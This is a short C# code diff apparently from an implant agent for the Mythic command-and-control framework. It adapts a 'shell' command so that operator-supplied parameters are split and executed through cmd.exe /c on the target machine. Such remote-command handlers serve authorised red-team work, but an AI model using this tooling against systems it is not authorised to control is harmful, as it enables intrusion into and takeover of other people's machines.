@@ -11,12 +11,14 @@ namespace Cerberus.Commands
     {
         public override string Name => "shell";
 
-        public override string Execute(CerberusTask task)
+        public override string Execute(MythicTask task)
         {
-            if (task.Arguments is null || task.Arguments.Length == 0)
+            var Arguments = task.parameters.Split(' ');
+
+            if (Arguments is null || Arguments.Length == 0)
                 return "No arguments supplied. Please supply a command to run";
 
-            var args = string.Join(" ", task.Arguments);
+            var args = string.Join(" ", Arguments);
             return Internal.Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", $"/c {args}");
         }
     }
